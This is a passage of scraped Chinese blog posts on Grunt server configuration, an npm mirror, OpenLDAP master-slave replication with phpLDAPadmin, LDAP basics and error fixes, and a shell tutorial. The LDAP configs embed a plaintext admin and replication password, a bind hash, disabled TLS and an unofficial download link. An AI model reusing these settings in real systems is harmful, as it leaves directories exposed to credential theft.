'assets/smeite.all.css': ['/play21/smeite.com/public/assets/css/**/*.css'] // &#125; // &#125;, with_banner: &#123; options: &#123; banner: '/* My minified css file test test */' &#125;, files: &#123; 'assets/min/base.css': ['css/base.css'], 'assets/min/global.css': ['css/global.css'] &#125; &#125;&#125;&#125;); // Load the plugin that provides the \"uglify\" task. grunt.loadNpmTasks('grunt-contrib-uglify'); grunt.loadNpmTasks('grunt-contrib-cssmin'); // Default task(s). grunt.registerTask('default', ['uglify']);&#125;; 这里我自己配置的： 12345678910111213141516171819202122232425262728293031323334353637383940414243module.exports = function (grunt) &#123; grunt.initConfig(&#123; pkg: grunt.file.readJSON('package.json'), connect:&#123; yjklog:&#123; options:&#123; port:8088, 端口 base:'yjklog/front', 文件后台的日志查询的 livereload:true, hostname:'192.168.1.133' 本机机器 &#125; &#125;, yjk:&#123; options:&#123; port:8080, 端口 base:'yjk/front', 后台 livereload:true, hostname:'192.168.1.133' &#125; &#125;, jgs:&#123; options:&#123; port:80, 端口 base:'yjk/jgs', 项目后台访问 livereload:true, hostname:'192.168.1.182' &#125; &#125; &#125;, watch: &#123; options: &#123; livereload: '&lt;%= connect.yjklog.options.livereload %&gt;' &#125;, files: [ '&lt;%= pkg.root %&gt;/app/**/*', '&lt;%= pkg.root %&gt;/assets/**/*' ] &#125; &#125;); grunt.loadNpmTasks('grunt-contrib-connect'); grunt.loadNpmTasks('grunt-contrib-watch'); grunt.registerTask('default', ['connect','watch']);&#125;; 所有在Gruntfile.js 配置了2个grunt插件:grunt-contrib-connect 和 grunt-contrib-watch如果项目只需要压缩js和css文件。所有在Gruntfile.js 配置了2个grunt插件： grunt-contrib-uglify 和 grunt-contrib-cssmin 安装 grunt 插件：在git 客户端键入命令 cd /health-Grunt; 1234键入命令 npm install grunt-contrib-watch 安装watch键入命令 npm install grunt-contrib-connect 安装connect键入命令 npm install grunt-contrib-uglify 安装uglify键入命令 npm install grunt-contrib-cssmin 安装cssmin 官方的的话：查看第4步 12344、 准备相关资料在 testGrunt 目录下，创建 js目录，并在js目录下创建文件config.js smeite.js index.js ，创建css目录，并在css目录下创建base.css 和 global.css。 （这些文件都在Gruntfile.js 有配置，所以需要创建，内容可以随意的写）5、执行grunt 命令执行js压缩命令 grunt uglify 效果如下 我参考官网上面我Gruntfile.js 有配置，需要创建这些文件目录。yjk,front,yjklog.后面就是前端事情了。具体的就不详解了！可以查看我github上面有详细的文档。 启动服务：1在目录当前后台启动: grunt &amp; 搭建后台，需要对后台的端口开放防火墙设置。 去掉nginx js、css解压缩1234567# location ~ .*\\.(js\\|css)?$ &#123;# root /var/www/new/qiantai;# default_type application/x-javascript；# add_header Vary Accept-Encoding;# add_header Content-Encoding gzip;# gzip off;# &#125;","link":"/2016/11/24/Node.js-npm/Node.js-Grunt工具搭建后台管理实践/"},{"title":"npm翻墙加速国内镜像","text":"问题Node.js 的依赖包管理生态系统 npm, 是世界上最大的生态系统开源库。 但国内使用 npm 来安装软件，速度很慢，有时候甚至直接就失败了！比如我安装stf就需要翻墙或者VPN去安装，可是就一直卡着。 原因npm 默认是从国外的源获取和下载包信息，不慢才怪，有时甚至被墙，导致无法正常安装软件。 解决可以采用国内的 npm 镜像来解决网速慢的问题。这里以“淘宝 NPM 镜像”举例。淘宝 NPM 镜像这是一个完整 npmjs.org 镜像，你可以用此代替官方版本(只读)，同步频率目前为 10分钟 一次以保证尽量与官方服务同步，镜像地址为 registry.npm.taobao.org， 是从 registry.npmjs.org 进行全量同步的。 方法1：使用 –registry在安装软件时，使用 –registry 来注册镜像地址到国内的镜像 如： 1npm install gitbook-cli -g --registry=http://registry.npm.taobao.org 这样，安装软件速度会很快哦。 方法2：设置 registry方法1 是每次使用都需要注册镜像源，未免繁琐。设置国内的镜像为默认镜像源，则更为方便： 1npm config set registry=http://registry.npm.taobao.org 方法3：使用 cnpm1cnpm 是 npm 中国镜像的 npm 客户端，可以代替 npm。 先用 npm 安装 cnpm： 1npm install -g cnpm --registry=https://registry.npm.taobao.org 而后，安装软件就能直接用 cnpm 代替 npm 了： 1cnpm install [name] 参考 http://npm.taobao.org/ https://nodejs.org/docs/latest-v0.12.x/api/","link":"/2016/08/21/Node.js-npm/npm翻墙加速国内镜像/"},{"title":"OpenLDAP一主多从复制节点服务的配置-phpldapadmin管理认证","text":"OpenLDAP主从复制节点配置线上版本公司服务器上搭建了一个OpenLDAP服务，为了避免出现单点，需要给LDAP做主从要从国外从服务器实时同步。这里我也升级了Openldap 配置一主多从方法。于是上openldap官网上查了一下openldap的复制功能。 OpenLDAP软件2.3管理员指南 OpenLDAP前期配置准备： OpenLDAP同步条件： 123456789一主多从OpenLDAP集群服务器：特意声明下：2.3版本实现不了1主多从，只能实现1主1从。1.Linux系统最好保持一致：CentOS release 6.7 2.LDAP服务器之间需要保持时间同步 /usr/sbin/ntpdate ntp.api.bz3.LDAP软件包版本保持一致 openldap-2.4.404.节点之间的域名可以互相解析 5.配置LDAP同步复制，需要提供完全一致的配置及目录树信息 （这里我会重点讲如何初始化数据）6.数据条目保持一致 （数据和结构目录统一化）7.额外的schema文件保持一致 openldap支持5种复制方式，分别是:12345Syncrepl：slave服务器从master上拉取数据，缺点是拉取的最小粒度是单条记录Delta-syncrepl：与上一条相似，但拉取的最小粒度是属性N-Way Multi-Master：多主，支持2个及以上的masterMirrorMode：双主镜像，不支持3个及以上的master，但可以有slaveSyncrepl Proxy：代理模式 同步需要开启syncrepl模式： 123slave服务器到master服务器以拉的模式同步目录树。当主服务器对某个条目或更多条目修改条目属性时，slave服务器会把修改的整个条目进行同步，而不是单独的同步修改的属性值。 按目前的需求只要配置成MirrorMode即可，编辑/etc/openldap/sldap.conf找到“moduleload syncprov.la”，将前面的#号去掉。 操作系统信息：CentOS_6.x_64 备注：6.0以下系统安装版本会过低，不支持一主多从配置。 角色 主机名 IP 地址 OpenLDAP MAster服务器 openldap-master 192.168.17.145 OpenLDAP slave1服务器 openldap-slave1 192.168.3.15 OpenLDAP slave2服务器 openldap-slave2 192.168.3.82 安装方法我在另外一篇安装配置文档很详细的写出。 这里我快速命令操作 不做太多的命令描述了。 初始化数据结构初始化命令： 12345678910111213cp -a /var/lib/ldap /var/lib/ldap.backuprm -f /var/lib/ldap/*cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIGcp -a /etc/openldap/slapd.d/ /etc/openldap/slapd.dbakuprm -rf /etc/openldap/slapd.d/*chown ldap.ldap /var/lib/ldap/*chmod -R 600 /var/lib/ldap/*chown -R ldap:ldap /etc/openldap/slapd.dcd /var/lib/ldap/ &amp;&amp; slapdslaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.dchown -R ldap:ldap /etc/openldap/slapd.dchown ldap.ldap /var/lib/ldap/*service slapd restart 主服务器 Master | Centos6.6安装OpenLDAP1234567891011121314151617181920添加host配置：1.时间同步：因为使用的是xx云主机，默认添加的有时间同步，这里就不在描述。yum快速安装openldap# yum install -y vim automake autoconf gcc xz ncurses-devel \\ patch python-devel git python-pip gcc-c++ # 安装基本环境，后面依赖# yum install -y openldap openldap-servers openldap-clients openldap-devel配置 OpenLDAP 服务器#拷贝LDAP配置文件到LDAP目录# cp /usr/share/openldap-servers/slapd.conf.obsolete /etc/openldap/slapd.conf ## 该文件是slapd的配置文件# cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG ## 数据库的配置文件# cd /etc/openldap/# cp slapd.conf slapd.conf.bak 编辑LDAP主配置文件 slapd.conf 文件如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155include /etc/openldap/schema/corba.schemainclude /etc/openldap/schema/core.schemainclude /etc/openldap/schema/cosine.schemainclude /etc/openldap/schema/duaconf.schemainclude /etc/openldap/schema/dyngroup.schemainclude /etc/openldap/schema/inetorgperson.schemainclude /etc/openldap/schema/java.schemainclude /etc/openldap/schema/misc.schemainclude /etc/openldap/schema/nis.schemainclude /etc/openldap/schema/openldap.schemainclude /etc/openldap/schema/ppolicy.schemainclude /etc/openldap/schema/collective.schema# Allow LDAPv2 client connections. This is NOT the default.allow bind_v2disallow bind_anon #阻止匿名登陆# Do not enable referrals until AFTER you have a working directory# service AND an understanding of referrals.#referral ldap://root.openldap.orgpidfile /var/run/openldap/slapd.pidargsfile /var/run/openldap/slapd.args# Load dynamic backend modules# - modulepath is architecture dependent value (32/64-bit system)# - back_sql.la overlay requires openldap-server-sql package# - dyngroup.la and dynlist.la cannot be used at the same timemodulepath /usr/lib/openldapmodulepath /usr/lib64/openldap# moduleload accesslog.la# moduleload auditlog.la# moduleload back_sql.la# moduleload chain.la# moduleload collect.la# moduleload constraint.la# moduleload dds.la# moduleload deref.la# moduleload dyngroup.la# moduleload dynlist.la# moduleload memberof.la# moduleload pbind.la# moduleload pcache.la# moduleload ppolicy.la# moduleload refint.la# moduleload retcode.la# moduleload rwm.la# moduleload seqmod.la# moduleload seqmod.la# moduleload smbk5pwd.la# moduleload sssvlv.lamoduleload syncprov.la# moduleload translucent.la# moduleload unique.la# moduleload valsort.la# The next three lines allow use of TLS for encrypting connections using a# dummy test certificate which you can generate by running# /usr/libexec/openldap/generate-server-cert.sh. Your client software may balk# at self-signed certificates, however.TLSCACertificatePath /etc/openldap/certsTLSCertificateFile \"\\\"OpenLDAP Server\\\"\"TLSCertificateKeyFile /etc/openldap/certs/password# Sample security restrictions# Require integrity protection (prevent hijacking)# Require 112-bit (3DES or better) encryption for updates# Require 63-bit encryption for simple bind# security ssf=1 update_ssf=112 simple_bind=64# Sample access control policy:# Root DSE: allow anyone to read it# Subschema (sub)entry DSE: allow anyone to read it# Other DSEs:# Allow self write access# Allow authenticated users read access# Allow anonymous users to authenticate# Directives needed to implement policy:# access to dn.base=\"\" by * read# access to dn.base=\"cn=Subschema\" by * read# access to *# by self write# by users read# by anonymous auth## if no access controls are present, the default policy# allows anyone and everyone to read anything but restricts# updates to rootdn. (e.g., \"access to * by * read\")## rootdn can always read and write EVERYTHING!access to dn.subtree=\"ou=users,dc=jollychic,dc=com\" by self write by dn=\"cn=Manager,dc=jollychic,dc=com\" write by dn=\"cn=repl,ou=manager,dc=jollychic,dc=com\" write by dn.exact=\"cn=zabbix,ou=manager,dc=jollychic,dc=com\" read by users read by anonymous auth access to * by self write by users read by anonymous auth# enable on-the-fly configuration (cn=config)database configaccess to * by dn.exact=\"gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\" manage by * none# enable server status monitoring (cn=monitor)database monitoraccess to * by dn.exact=\"gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\" read by dn.exact=\"cn=Manager,dc=my-domain,dc=com\" read by * none######################################################################## database definitions#######################################################################database bdbsuffix \"dc=jollychic,dc=com\" checkpoint 1024 15rootdn \"cn=Manager,dc=jollychic,dc=com\"# Cleartext passwords, especially for the rootdn, should# be avoided. See slappasswd(8) and slapd.conf(5) for details.# Use of strong authentication encouraged.# rootpw secret# rootpw &#123;crypt&#125;ijFYNcSNctBYgrootpw se12pa #管理员密码# The database directory MUST exist prior to running slapd AND# should only be accessible by the slapd and slap tools.# Mode 700 recommended.directory /var/lib/ldap #存储目录# Indices to maintain for this databaseindex objectClass eq,presindex ou,cn,mail,surname,givenname eq,pres,subindex uidNumber,gidNumber,loginShell eq,presindex uid,memberUid eq,pres,subindex nisMapName,nisMapEntry eq,pres,subindex entryCSN,entryUUID eq# syncprov配置#配置末尾添加如下3行# ########################################################################后端工作在overlay模式overlay syncprov#当满足需改100个entry或者10分钟的条件时主动以推的方式执行syncprov-checkpoint 100 10#会话日志条目的最大数量syncprov-sessionlog 100 修改系统日志配置文件123456# vim /etc/rsyslog.conf local4.* /var/log/ldap.log# local7.*下添加一行在启动服务。# service rsyslog restart 测试 slapd.conf 设置 slaptest检测、生成数据库12[root@openldap-master openldap]# slaptest -uconfig file testing succeeded OpenLDAP 的启动与停止123456# service slapd stop# rm -rf /etc/openldap/slapd.d/*#chown ldap.ldap /var/lib/ldap/*# slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d# chown -R ldap:ldap /etc/openldap/slapd.d# service slapd restart 配置管理脚本：可以写成脚本 12345678910#----------------------------------------------------vim ldap.sh#----------------------------------------------------#!/bin/bash/etc/init.d/slapd stoprm -rf /etc/openldap/slapd.d/*slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.dchown -R ldap.ldap /etc/openldap/slapd.d/etc/init.d/slapd start#---------------------------------------------------- 设置开机启动： 12[root@Ldap-Server ldap]# chkconfig slapd on[root@Ldap-Server ldap]# chkconfig rsyslog on 默认使用端口为389 通过ssl协议加密后slapd进程使用663端口号 123[root@Ldap-Server ldap]# netstat -lntup|grep 389tcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 25358/slapdtcp 0 0 :::389 :::* LISTEN 25358/slapd 这里创建好以后再参考第一篇创建导入点数据，作为设置同步查看效果。 使用 phpLDAPadmin1234567891011121314#安装PHPyum -y install php-gd php-xml php-mbstring php-ldap php-pear php-xmlrpc php 需要PHP模块支持#安装Apacheyum install httpd -yvi /etc/httpd/conf/httpd.conf添加：....ServerName 192.168.17.145:80Listen 80.....service httpd start 先通过scp上传phpldapadmin-1.2.3.zip到apache网页目录 下载：phpldapadmin 或者这里用我下载好的链接wget. 12345678910111213141516171819202122232425262728293031323334#1. 下载安装 cd /var/www/html/ wget http://oak0aohum.bkt.clouddn.com/phpldapadmin-1.2.3.tgz tar -zxvf phpldapadmin-1.2.3.tgz mv phpldapadmin-1.2.3 phpldapadmin cd phpldapadmin/config/ cp config.php.example config.php vim config.php#2. 修改配置文件：vim /var/www/html/phpldapadmin/config/config.php/*$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','LDAP Server');$servers-&gt;setValue('server','host','192.168.17.145');$servers-&gt;setValue('server','port',389);$servers-&gt;setValue('server','base',array('dc=jollychic,dc=com'));$servers-&gt;setValue('login','auth_type','cookie');$servers-&gt;setValue('login','bind_id','cn=Manager,dc=jollychic,dc=com');$servers-&gt;setValue('login','bind_pass','&#123;SSHA&#125;SlPVguw1zrxCkTnGXLM2jZpDZio9Btyt');$servers-&gt;setValue('server','tls',false);#apache-http修改 vim /etc/httpd/conf/httpd.conf &lt;Directory \"/var/www/html/phpldapadmin\"&gt; DirectoryIndex index.html index.html.var index.php#重启服务。 service httpd restart#防火墙端口开启 -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT#重启iptables service iptables restart 登录PHPldapadmin slave1 | Centos6.6安装OpenLDAPOpenLDAP slave1服务器| openldap-slave1 | 192.168.3.15 前面安装全部一样，只需要在slave配置上面做下修改： 123456789101112131415161718192021# syncprov配置# #######################################################################overlay syncprovsyncprov-checkpoint 100 10syncprov-sessionlog 100syncrepl rid=123 provider=ldap://192.168.17.145:389 type=refreshAndPersist searchbase=\"dc=jollychic,dc=com\" interval=00:00:00:10 schemachecking=off searchbase=\"dc=jollychic,dc=com\" bindmethod=simple scope=sub binddn=\"cn=Manager,dc=jollychic,dc=com\" retry=\"60 +\" attrs=\"*,+\" credentials=se12pa mirrormode on slave2 | Centos6.6安装OpenLDAPOpenLDAP slave2服务器| openldap-slave2 | 192.168.3.82 只需要修改rid=124 可以往后添加ID数字加1 123456789101112131415syncrepl rid=124 provider=ldap://192.168.17.145:389 type=refreshAndPersist searchbase=\"dc=jollychic,dc=com\" interval=00:00:00:00 schemachecking=off searchbase=\"dc=jollychic,dc=com\" bindmethod=simple scope=sub binddn=\"cn=Manager,dc=jollychic,dc=com\" retry=\"60 +\" attrs=\"*,+\" credentials=se12pa mirrormode on 解释说明： 1234567891011121314151617# syncrepl特有的索引 index entryCSN eq index entryUUID eq # syncrepl参数 syncrepl rid=203 provider=ldap://IP地址:端口 #提供者的IP和端口号 provider项填写主服务器的ldap地址bindmethod=simple #认证方式，默认选择简单认证 interval=00:00:00:00 #同步时间间隔 天：小时：分钟：秒 interval表示从服务器多久跟主服务器进行一次数据同步binddn=\"cn=Manager,dc=jollychic,dc=com\" #登陆的ldap账号 credentials=登陆密码 searchbase=\"dc=jollychic,dc=com\" #同步的根路径 filter=\"(objectClass=*)\" scope=sub attrs=\"*,+\" type=refreshAndPersist #同步方式：有refreshAndPersist和 retry=\"60 10 600 +\" # retry表示失败重试策略 PS:在phpldapadmin添加从LDAP服务器、便于管理12345678910111213/* A convenient name that will appear in the tree viewer and throughout phpLDAPadmin to identify this LDAP server to users. */$servers-&gt;setValue('server','name','My LDAP Server');$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','192.168.3.15:389');$servers-&gt;setValue('server','host','192.168.3.15');$servers-&gt;setValue('server','port','389');$servers-&gt;newServer('ldap_pla');$servers-&gt;setValue('server','name','192.168.3.82:389');$servers-&gt;setValue('server','host','192.168.3.82');$servers-&gt;setValue('server','port','389'); 登录测试数据是否同步： slave1 数据同步成功图： slave2 数据同步成功图： 遇到故障问题： 123456789[root@ldap-master ~]# ldapsearch -x -LLLNo such object (32)打开并修改为如下两行即可vim /etc/openldap/ldap.conf#-----------------------------------------------------------------BASE dc=jollychic,dc=comURI ldap://192.168.17.145#----------------------------------------------------------------- 测试结果，主从配置成功。 补充：由于在syncrepl中slave是refreshOnly，相当于从节点是只读的，这时不允许在从节点导入或者删除用户，否则会出现错误，如下所示。 12345[root@LDAP openldap]# ldapadd -x -D \"cn=Manager,dc=jollychic,dc=com\" -W -f /tmp/jolly.ldifEnter LDAP Password:adding new entry \"dc=jollychic,dc=com\"ldap_add: Server is unwilling to perform (53) additional info: shadow context; no update referral 参考：https://itsecureadmin.com/2013/01/ldapmodify-fails-with-server-is-unwilling-to-perform-53/","link":"/2017/06/08/OpenLDAP/OpenLDAP一主多从复制节点服务的配置-phpldapadmin管理认证/"},{"title":"OpenLDAP入门了解学习笔记(一)","text":"OpenLDAP入门了解LDAP概述我的个人理解：LDAP是轻量目录访问协议(Lightweight Directory Access Protocol)的缩写，LDAP是一个统一的账号管理认证平台，使用轻量级目录访问协议（LDAP）构建集中的身份验证系统可以减少管理成本，增强安全性，避免数据复制的问题，并提高数据的一致性。随着 Linux的不断成熟，已经出现了很多工具用来简化用户帐号信息到 LDAP目录的迁移。还开发了一些工具用来在客户机和目录服务器之间启用加密通信配置，并通过复制提供容错性。本文将向您展示如何配置服务器和客户机在Centos上使用OpenLDAP。 官方解释： 什么是LDAP? LDAP的英文全称是Lightweight Directory Access Protocol，一般都简称为LDAP。它是基于X.500标准的，但是简单多了并且可以根据需要定制。与X.500不同，LDAP支持TCP/IP，这对访问Internet是必须的。LDAP的核心规范在RFC中都有定义，所有与LDAP相关的RFC都可以在LDAPman RFC网页中找到。 怎么使用LDAP这个术语呢？ 在日常交谈中，你可能会听到有些人这么说：“我们要把那些东西存在LDAP中吗？”，或者“从LDAP数据库中取出那些数据！”，又或者“我们怎么把LDAP和关系型数据库集成在一起？”。严格地说，LDAP根本不是数据库而是用来访问存储在信息目录（也就是LDAP目录）中的信息的协议。更为确切和正式的说法应该是象这样的：“通过使用LDAP，可以在信息目录的正确位置读取（或存储）数据”。但是，也没有必要吹毛求疵，尽管表达得不够准确，我们也都知道对方在说什么。 规划 LDAP 目录结构要真正了解 LDAP,可以从规划一个 LDAP 目录树开始。以下是一个简单的例子。假设有一个名为 Example 的公司(DNS 名为example.com). 在规划过程中,首先要为目录树建立一个“根(root)”。根是目录树的最顶层,之后建立的所 有对象都是基于这个根的,也称为基准 DN。具有三种格式表示。 1使用 x.500标准格式:o=example,c=CN。 直接使用公司的 DNS 域名:o=example.com。 使用公司的 DNS 域名的不同部分:dc=example,dc=com。 一般而言,推荐使用第三种格式,因为其更利于以后目录树的扩展,若将来 Example 公司合并了 Test 公司,只需要将 Test.com 作为根即可,不需要修改原有的结构。公司中的部门作为 OU,如“ou=sales”。 OU 是目录树的分枝节点,OU 之下可以包含其他分枝节点或叶子节点。 用户是目录数的最底层(即叶子节点),可以根据用户所在的部门位于不同的 OU 中,使用 uid或 cn 描述都可,如“uid=tom”或“cn=Kelly King”。因此,可以将 Example 公司的组织结构转化为如图所示的 LDAP 目录树。 图- LDAP 目录树 LDAP的功能在LDAP的功能模型中定义了一系列利用LDAP协议的操作，主要包含以下4部分： 查询操作 ：允许查询目录和取得数据，其查询性能比关系数据库好。 更新操作 ：目录的更新操作没关系数据库方便，更新性能较差，但也同样允许进行添加、删除、修改等操作。 复制操作 ：前面也提到过，LDAP是一种典型的分布式结构，提供复制操作，可将主服务器的数据的更新复制到设置的从服务器中。 认证和管理操作 ：允许客户端在目录中识别自己，并且能够控制一个会话的性质。 LDAP目录的优势 LDAP协议是跨平台的和标准的协议，因此应用程序就不用为LDAP目录放在什么样的服务器上操心了。 LDAP服务器可以用“推”或“拉”的方法复制部分或全部数据，例如：可以把数据“推”到远程的办公室，以增加数据的安全性。复制技术是内置在LDAP服务器中的而且很容易配置。 LDAP协议的特点 LDAP是一种目录服务，保存在特殊的数据库中，数据的读取速度远高于写入速度。 LDAP对查询做了优化，读取速度优于普通关系数据库。 LDAP不支持事务、不能进行回滚，需要进行这些操作的应用只有选择关系数据库。 LDAP采用服务器/客户端模式，支持分布式结构。 LDAP中的条目以树形结构组织和存储。 LDAP基于Internet协议，直接运行在简单和通用的TCP/IP或其他可靠的传输协议层上，使连接的建立和包的处理简单、快捷，对于互联网和企业网应用都很方便。 LDAP协议简单，通过使用查找操作实现列表操作和读操作。 LDAP通过引用机制实现分布式访问，通过客户端API实现分布式操作（对于应用透明），平衡了负载。 LDAP实现具有低费用、易配置和易管理的特点，并提供了满足应用程序对目录服务所需求的特性。","link":"/2017/01/26/OpenLDAP/OpenLDAP入门了解学习笔记(一)/"},{"title":"OpenLDAP企业应用方案-PPT认识LDAP+熟悉操作LDAP命令","text":"认识LDAP熟悉LDAP配置LDAP目录中可以存储各种类型的数据：电子邮件地址、邮件路由信息、人力资源数据、公用密匙、联系人列表，等等但是不是关系型数据库。不象被设计成每分钟需要处理成百上千条数据变化的数据库可以把数据“推”到远程的办公室，以增加数据的安全性复制功能，数据库产商就会要你支付额外的费用，而且也很难管理 LDAP组织-目录树的结构1234567891011121314151617181920212223LDAP目录中的所有记录项都有一个唯一的“Distinguished Name”现在为公司的员工设置一个DN。可以用基于cn或uid（User ID），作为典型的用户帐号用uid表示“User ID”，不要把它和UNIX的uid号混淆了 ，大多数公司都会给每一个员工唯一的登录名，因此用这个办法可以很好地保存员工的信息LDIF文件格式例子：一个普通用户都要存哪些信息?你可以用LDAP存储各种类型的数据对象，只要这些对象可以用属性来表示，下面这些是可以在LDAP中存储的一些信息： 员工信息：员工的姓名、登录名、口令、员工号、他的经理的登录名，邮件服务器，等等。 lDAP默认端口：端口为389LDAP同步配置:# Where to store the replica logs for database #1#replogfile /var/lib/ldap/master-slapd.replogreplogfile /var/lib/ldap/master-slapd.replogreplica host=192.168.7.108:389 binddn=\"cn=admin,dc=ldap,dc=monkey,dc=com,dc=de\" bindmethod=simple credentials='password' OpenLDAP 包在服务器上安装了很多程序：123456789101112131415161718 守护进程：- slapd：主 LDAP 服务器- slurpd：负责与复制 LDAP 服务器保持同步的服务器- 对网络上的目录进行操作的客户机程序。下面这两个程序是一对儿：- ldapadd：打开一个到 LDAP 服务器的连接，绑定、修改或增加条目- ldapsearch：打开一个到 LDAP 服务器的连接，绑定并使用指定的参数进行搜索- 对本地系统上的数据库进行操作的几个程序：- slapadd：将以 LDAP 目录交换格式（LDIF）指定的条目添加到 LDAP 数据库中- slapcat：打开 LDAP 数据库，并将对应的条目输出为 LDIF 格式 Openldap命令操作总结：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152解读配置文件：vim /etc/openldap/slapd.conf例子 创建用户ldapadd -x -D \"cn=Manager,dc=jollychic,dc=com\" -w secret -f /root/test.ldif ldapadd -x -D \"cn=Manager,dc=jollychic,dc=com\" -w secret (这样写就是在命令行添加条目)-x 进行简单认证-D 用来绑定服务器的DN-w 绑定DN的密码-b 指定要查询的根节点-H 制定要查询的服务器-S 提示的输入密码-s pass 把密码设置为pass-a pass 设置old passwd为pass-A 提示的设置old passwd-I 使用sasl会话方式这样可以访问整个的活动目录结构.ldapsearch -x -W -D \"cn=Manager,dc=jollychic,dc=com\" -b \"dc=jollychic,dc=com\" se12paldapsearch -x -W -D \"uid=764,ou=users,dc=jollychic,dc=com\" -b \"uid=764,ou=users,dc=jollychic,dc=com\"使用简单认证，用 \"ou=users,dc=jollychic,dc=com\" 进行绑定，要查询的根是 \"dc=jollychic,dc=com\"。这样会把绑定的用户能访问\"uid=764,ou=users,dc=jollychic,dc=com\"下的所有数据显示出来。ldapdelete -x -D \"cn=Manager,dc=jollychic,dc=com\" -W \"uid=900,ou=users,dc=jollychic,dc=com\" -Sldapmodify命令,在changetype时输入：delete修改用户密码：ldappasswd -x -D \"cn=Manager,dc=jollychic,dc=com\" -W \"uid=900,ou=users,dc=jollychic,dc=com\" -SNew password:Re-enter new password:Enter LDAP Password:就可以更改密码了，如果原来记录中没有密码，将会自动生成一个userPassword。##Enter LDAP password\" 是 \"cn=Manager,dc=jollychic,dc=com\"管理员的密码.管理员密码更改#slappasswdNew passwordRe-enter new password","link":"/2017/03/03/OpenLDAP/ OpenLDAP 企业应用方案 -PPT认识LDAP+熟悉操作LDAP命令/"},{"title":"OpenLDAP 错误收集","text":"OpenLDAP 错误收集启动slapd服务：报错 12345678910Checking configuration files for slapd: [WARNING]bdb_db_open: warning – no DB_CONFIG file found in directory /var/lib/ldap: (2).Expect poor performance for suffix “dc=my-domain,dc=com”.config file testing succeeded操作命令：rm -rf /var/lib/ldap/*cp /usr/share/doc/openldap-servers-2.4.12/DB_CONFIG.example /var/lib/ldap/DB_CONFIGchown -R ldap:ldap /var/lib/ldap/etc/init.d/ldap restart slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d 报错： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[root@yancy ldap]# slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d59842dbe bdb_db_open: database \"dc=jollychic,dc=com\": db_open(/var/lib/ldap/id2entry.bdb) failed: No such file or directory (2).59842dbe backend_startup_one (type=bdb, suffix=\"dc=jollychic,dc=com\"): bi_db_open failed! (2)slap_startup failed (test would succeed using the -u switch)解决操作命令：解决方法： cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIGchown -R ldap.ldap /var/lib/ldap继续检查配置文件slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d如果还继续报错：删掉slapd.d下的文件，重新生成 不然待会启动时会报错[root@yancy ldap]# rm -rf slapd.d/*[root@yancy ldap]# cd /var/lib/ldap/[root@yancy ldap]# slapd测试 slapd.conf 设置 slaptest -ucp -a /etc/openldap/slapd.d/ /etc/openldap/slapd.dbakup0810rm -rf /etc/openldap/slapd.d/*chown ldap.ldap /var/lib/ldap/*chmod -R 600 /var/lib/ldap/*cd /var/lib/ldap/ &amp;&amp; slapdslaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d如果还不行：rm -rf /etc/openldap/slapd.d/*rm -rf rm -rf /var/lib/ldap/__db.00*rm -rf /var/lib/ldap/alock/etc/init.d/slapd restartchown -R ldap:ldap /etc/openldap/slapd.dchown ldap.ldap /var/lib/ldap/*service slapd restart3. 导入数据报错： [root@H5 ldap]# ldapadd -x -D \"cn=Manager,dc=jollychic,dc=com\" -W -f /tmp/base.ldifEnter LDAP Password:adding new entry \"dc=jollychic,dc=com\"ldap_add: Server is unwilling to perform (53)additional info: shadow context; no update referral","link":"/2017/04/08/OpenLDAP/OpenLDAP 错误收集/"},{"title":"shell入门到简单 学习总结1-12章","text":"TOC[TOC] 第一章Shell前言：Shell本身是一种用C语言编写的程序，从用户的角度来看，Shell是用户与Linux操作系统沟通的桥梁。用户既可以输入命令执行，又可以利用 Shell脚本编程，完成更加复杂的操作。在Linux GUI日益完善的今天在运维领域Shell编程仍然起着不可忽视的作用。深入地了解和熟练地掌握Shell编程，是每一个Linux用户的必修。 1.1 Linux的Shell种类：Bash在日常工作中被广泛使用，同时，Bash也是大多数Linux系统默认的Shell. 经常可以看到#!/bin/sh，它同样也可以改为#!/bin/bash。 第二章Shell脚本格式1.1 第一行#!的作用是指定该脚本程序的命令解释器： 123#!/bin/bashecho \"Hello the world\" 2.1 执行脚本需要添加权限和运行脚本的方式 12345chmod a+x print.sh 如果没有权限通过bash/sh方式：bash print.sh #调用bash程序解释器脚本内容执行sh print.sh #调用sh程序解释脚本内容并执行 第三章Shell变量shell变量变量是shell 传递数据的一种方法。变量是用来代表每个值的符号名。 1.1 Shell 有两类变量：临时变量和永久变量。 临时变量: 是shell 程序内部定义的，其使用范围仅限于定义它的程序，对其它程序不可见。永久变量: 是环境变量，其值不随shell 脚本的执行结束而消失。 例： 12[root@xuegod63 test]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin 2.1 用户定义变量：由字母或下划线打头。 由字母、数字或下划线组成，并且大小写字母意义不同。变量名长度没有限制。引用变量值时，要在变量名前加上前缀“$” 12345[root@xuegod63 test]# A=aaa# echo $Aaaa[root@xuegod63 test]# A = aaabash: A: command not found 3.1 位置变量和特殊变量 位置变量：Shell解释执行用户的命令时，将命令行的第一个字作为命令名，而其它字作为参数。由出现在命令行上的位置确定的参数称为位置参数。位置变量：使用$N 来表示 123[root@xuegod63 test]# ./example.sh file1 file2 file3$0 这个程序的文件名 example.sh$n 